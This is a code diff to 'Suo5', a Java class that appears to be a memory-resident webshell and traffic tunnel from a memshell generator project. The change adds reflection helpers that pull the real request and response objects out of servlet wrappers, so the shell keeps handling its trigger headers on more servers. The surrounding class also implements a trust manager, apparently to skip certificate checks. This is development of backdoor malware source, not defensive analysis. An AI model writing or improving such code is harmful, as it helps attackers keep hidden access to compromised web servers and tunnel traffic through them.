@@ -3,6 +3,7 @@ package com.reajason.javaweb.memshell.shelltool.suo5;
 
 import javax.net.ssl.*;
 import java.io.*;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.*;
 import java.nio.ByteBuffer;
@@ -34,8 +35,8 @@ public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
-        Object request = args[0];
-        Object response = args[1];
+        Object request = unwrap(args[0], "request");
+        Object response = unwrap(args[1], "response");
         try {
             String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
             String contentType = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "Content-Type");
@@ -54,6 +55,30 @@ public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
         } catch (Throwable ignored) {
         }
         return false;
+    }
+
+    @SuppressWarnings("all")
+    public Object unwrap(Object obj, String fieldName) {
+        try {
+            return getFieldValue(obj, fieldName);
+        } catch (Throwable e) {
+            return obj;
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws Exception {
+        Class<?> clazz = obj.getClass();
+        while (clazz != Object.class) {
+            try {
+                Field field = clazz.getDeclaredField(name);
+                field.setAccessible(true);
+                return field.get(obj);
+            } catch (NoSuchFieldException var5) {
+                clazz = clazz.getSuperclass();
+            }
+        }
+        throw new NoSuchFieldException();
     }
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
